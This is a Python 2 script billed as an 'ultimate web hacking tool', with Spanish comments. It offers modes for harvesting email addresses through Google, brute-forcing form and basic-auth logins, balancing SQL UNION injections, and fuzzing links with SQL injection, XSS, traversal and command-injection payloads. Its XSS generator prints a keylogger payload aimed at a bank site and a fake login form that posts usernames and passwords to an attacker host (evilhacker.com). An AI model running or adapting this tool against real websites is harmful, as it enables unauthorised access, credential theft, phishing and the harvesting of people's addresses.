#!/usr/bin/python
# -*- coding: iso-8859-15 -*-
# ULTIMATE WEB HACKING TOOL by sha0@badchecksum.net
#
# webHack.py v0.4
# TODO: exceptions control, mejorar ayuda, adivinador de parámetros nuevos, echo test -> medir longitud máxima permitida


from hack import *
import sys
import re
import os
import binascii

def usage():
	print 'usage: '+sys.argv[0]+' <mode: e(m)ails (c)rawling (o)bjects (l)inkFuzz (e)choAnalysis (f)ormBrute (a)uth brute> <target> '
	print 'COOK environment to set a cookie'
	print 'POST environment to set the post'
	print 'Examples:'
	print ' m hotmail.com                                 Get mails from google.'
	print ' c www.hotmail.com                             Crawl this web and create some files with html, emails, htm and js comments.'
	print ' o hotmail.com                                 Look for hotmail objects at google.'
	print ' l file.lnks                                   param-manipulation to every link of the file (firt use crawl to extract the links)'
	print ' e http://x.com/xssvuln.php?parm1=##&param2=hi Use a echo feature to examine the filters and sanitizers.'
	print ' f http://www.hotmail.com incorrect wordlist   Post fields bruteforce, since the word incorrect disapear.'
	print ' a http://www.hotmail.com basic wordlist       Basic auth bruteforce.'
	print ' fe  http://www.hotmail.com 			  Form enumerator'
	print ' x <(k)eylogger (f)akeform>                    Cross Site Scripting generator.'
	print ' u http://a.com/a?id=1union+select+null+from+all_tables-- \'must have same number of\'     union parámeter number balancing.'
	print ' v http://a.com/a?id=1union+select+##+from+all_tables-- \'must be same type\'  12          union parámeter type balancing.'




if len(sys.argv) < 2 or len(sys.argv) > 5:
	usage()
	sys.exit(-1)

mode = sys.argv[1]
target =  sys.argv[2]
cook = os.getenv('COOK')
post = os.getenv('POST')
nav = Navigator()
if cook:
	nav.setCookie(cook)

def test(url,badguy):
	sys.stdout.write("\r"+url+"                             ") 
	sys.stdout.flush()
	html = nav.go(url)
	if not re.compile(badguy).search(html):
		print 'Correct:'
		print url
		print html
		print url
		sys.exit(1)

def bin(num):
	bin = ""
	while num:
		bin += str(num%2)
		num /= 2
	return bin

if mode == 'e':
	filtra=[]
	mark = re.compile('##')
	magic = 'jaklwejsdf'
	churro=''
	veredict=''
	transforma=[]
	dangerBytes = ['\'','"','`','$','-','*','%3f','%26','<','>','(',')',';','%5c','!','\\',',','.','_','@','|','&','/','../']

	if post:
		p = mark.sub(magic,post)
		html = nav.go(target,p)
	else:
		url = mark.sub(magic,target)
		html = nav.go(url)

	if re.compile(magic).findall(html):
		print 'Is vulnerable to echo analysis'

		for i in range(1,255):
			dangerBytes.append("%%%.2x"%i)

		for b in dangerBytes:
			if post:
				p =  mark.sub(b+magic,post)
				html = nav.go(target,p)
			else:
				url = mark.sub(b+magic,target)
				html = nav.go(url)

			htmlEncoded = re.compile('(\&.+\;)'+magic).findall(html)
			resp = re.compile('(.)'+magic).findall(html)
			if resp:
				resp = resp[0]
			else:
				resp=''

			if htmlEncoded:
				resp = htmlEncoded[0]

			if resp:
				# b --> in  c --> in resp --> out
				if len(b) == 3 and b[0] == '%':
					if htmlEncoded:
						veredict = "Sanitized"
						d = b
					else:
						c = re.compile('%').sub('',b)
						d = binascii.a2b_hex(c)

						if resp and resp == b:
							veredict = "Accepted"
							churro += b
						else:
							if resp == d:
								veredict = "Accepted and Decoded"
								churro += b
							else:
								veredict = "Sanitized"
						#d='\\'+d

					print b+'('+d+') ==> '+resp+'    %s' % veredict
				else:
					if resp == b:
						veredict = "Accepted"
						churro += b
					else:
						veredict = "Sanitized"

					print b+'    ==> '+resp+'    %s' % veredict
			else:
				print b+' ==> Filtered'
		print 'test: '+churro
	else:
		print 'Is not vulnerable to echo analysis'
	sys.exit(1)


		
if mode == 'u':
	badguy = sys.argv[3]

	for i in range(1,300):
		target = re.compile('null\+').sub('null,null+',target)
		print target
		test(target,badguy)

	print 'Bad luck!'
	sys.exit(1)

if mode == 'v':
	badguy = sys.argv[3]
	nulls = int(sys.argv[4])

	if nulls > 5:
		print 'Barrera las '+str(pow(3,nulls))+' variaciones que es improducente.'
		#sys.exit(1)
	
	print 'Existen '+str(pow(3,nulls))+' variaciones diferentes, reducidas a: '+str(pow(2,nulls))

	const_str = '\'\''
	const_int = '1'

	#All int
	#params=const_int
	#for i in range(1,nulls):
	#	params=params+','+const_int

	#url = re.compile('##').sub(params,target)
	#test(url,badguy)

	for indice in range(0,pow(2,nulls)):
		b = bin(indice)
		for i in range(len(b),nulls):
			b+='0'

		params=''
		for i in range(0,len(b)):
			if i==0:
				separator=''
			else:
				separator=','

			if b[i] == '0':
				params+=separator+'\'\''
			else:
				params+=separator+'0'
		
		url = re.compile('##').sub(params,target)
		test(url,badguy)
	sys.exit(1)


if mode == 'x':
	if target == 'k':
		print '"><script>var w=window.open("https://banca.es/sesion.html","_top"); w.document.write("<script>document.captureEvents(Event.KEYPRESS);document.onkeypress=keyb_hook;function keyb_hook (key) { var code; var key; if (!key) key = event; if (document.layers) code=key.which; else if(document.all) code=key.keyCode; else if(document.getElementById)   code=key.charCode; alert(\'capturando: \',String.fromCharCode(code));  } <"+"/s"+"cript>");  </script><!--'
	else:
		print '<form method=post action=http://www.evilhacker.com>User:<input type=text name=user><br>Password:<input type=password name=pwd><br><input type=submit></form>'
	sys.exit(1)

if mode == 'a':
	method = sys.argv[3]
	wordlist = sys.argv[4]
	f = open(wordlist,'r')
	words = f.readlines()
	f.close()
	for w in words:
		w = w[:-1]
		sys.stdout.write(w)
		nav.setAuth(method,w,w)
		resp = nav.go(target)
		print resp
		if re.compile('denied').findall(resp):
			 sys.stdout.write(' Denied                     \r')
			 sys.stdout.flush()
		else:
			print ' You get in!'
			sys.exit(1)

	sys.exit(1)



if mode == 'm':
	empleados=[]
	goo = Google()
	parse = HtmlParse()

	htm = goo.search('"@'+target+'"')
	eml = parse.getEmails(htm,target)
	dom = re.compile('@'+target,re.IGNORECASE)
	notfound = re.compile('Error 404',re.IGNORECASE)
	notfound2 = re.compile('La URL solicitada no se encont',re.IGNORECASE)

	for i in eml:
		e = dom.sub('',i)
		sys.stdout.write(i)

		#BlogSpot	
		htm = nav.go('http://'+e+'.blogspot.com')
		if notfound.findall(htm) or notfound2.findall(htm):
			sys.stdout.write('	http://'+e+'.blogspot.com')
		#HotMail
		htm = goo.search('"'+e+'@hotmail.com"')
		emls = parse.getEmails(htm,'hotmail.com')
		if len(emls) > 0:
			sys.stdout.write('	'+emls[0])
		#Neurona
		goo.MAX_PAGES=1
		htm = goo.search('site:neurona.com+'+e)
		lnks = parse.getLinks(htm,'neurona.com')
		if len(lnks) > 0:
			sys.stdout.write('	'+lnks[0])
		print
		
	sys.exit(1)

if mode == 'f':
	badguy = sys.argv[3]
	wordlist = sys.argv[4]
	pb = PostBrute()
	pb.setBadGuy(badguy)
	pb.getForm(target)
	pb.load(wordlist)
	if cook:
		pb.setCookie(cook)
	pb.brute()
	sys.exit(1)

if mode == 'c':
	c = Crawl(target)
	if cook:
		c.setCookie(cook)
	c.go()
	c.saveAll()
	sys.exit(1)

if mode == 'l':
	url = Url()
	parse = HtmlParse()
	att = Attack()

	# Cargar Fichero
	l = open(target,'r')
	lnks = l.readlines()
	l.close()

	# Eliminar objetos repetidos (aunque tengan distintos valores en los params)
	lnks = parse.unique(lnks)
	old=''
	links=[]
	for l in lnks:
		s =  re.compile('=[^&]').sub('',l) # Suprimir valores de los parametros
		if not s == old:
			links.append(l[:-1])
		old=s

	allParams = {}

	for l in links:
		if re.compile('\?').findall(l):	# Solo tratar los que tengan parametros

			# SQL Injection
			url.set(l)
			print url.gen()
			for p in range(0,len(url.params)):
				url.params[p] = re.compile('=[^&]+').sub('='+att.injatt,url.params[p])
			u = url.gen()
			#print u
			htm = nav.go(u)
			for r in att.injresp:
				if re.compile(r).search(htm):
					print 'SQL Injection: '+u+' '+r
					break;
		
			# Cross Site Scripting
			url.set(l)
			for p in range(0,len(url.params)):
				url.params[p] = re.compile('=[^&]+').sub('='+att.xssatt,url.params[p])
			u = url.gen()
			#print u
			htm = nav.go(u)
			for r in att.xssresp:
				if re.compile(r).search(htm):
					print 'XSS: '+u+' '+r
					break;

			# Transversal directory
			url.set(l)
			for t in range(0,len(att.transatt)):
				for p in range(0,len(url.params)):
					url.params[p] = re.compile('=[^&]+').sub('='+att.transatt[t],url.params[p])
				u = url.gen()
				#print u
				htm = nav.go(u)
				if re.compile(att.transresp[t]).search(htm):
					print 'TRANSV: '+u+' '

			# SHELL attack
			url.set(l)
			for c in att.cmdatt:
				for p in range(0,len(url.params)):
					url.params[p] = re.compile('=[^&]+').sub('='+c,url.params[p])
				u = url.gen()
				#print u
				htm = nav.go(u)
				for r in att.cmdresp:
					if re.compile(r).search(htm):
						print 'SHELL: '+u+' '+r

			# Detect shell sleep 6
			url.set(l)
			for p in range(0,len(url.params)):
				url.params[p] = re.compile('=[^&]+').sub('='+att.cmdsleep,url.params[p])
			u = url.gen()
			#print u
			htm = nav.go(u)
			print '>>'+u
			for r in att.cmdresp:
				if re.compile(r).search(htm):
					print 'SHELL: '+u+' '+r


	sys.exit(1)

if mode == 'o':
	goo = Google()
	parse = HtmlParse()
	interestingExtensions = ['php','asp','jsp','old','bkp','mdb','log','txt','cfm','pl','cgi','pdf','doc']
	dangerObjects = ['upload','shell','cmd','backdoor','passwd','htaccess','administrator','access','private','backoffice','staff']

	htm = ''
	for ext in interestingExtensions:
		htm += goo.search('site:'+target+'+filetype:'+ext)	
	for obj in dangerObjects:
		htm += goo.search('site:'+target+'+allinurl:'+obj)

	lnks = parse.getLinks(htm,target)	
	for l in lnks:
		print l
	sys.exit(1)

if mode == 'fe':
	c = Crawl2(target)
	c.blacklist.append('link')
	c.go();
	xml = c.exportForms();
	fd = open("forms.xml","w")
	fd.write(xml)
	fd.close()
	sys.exit(1)

print 'Incorrect mode!'
usage()

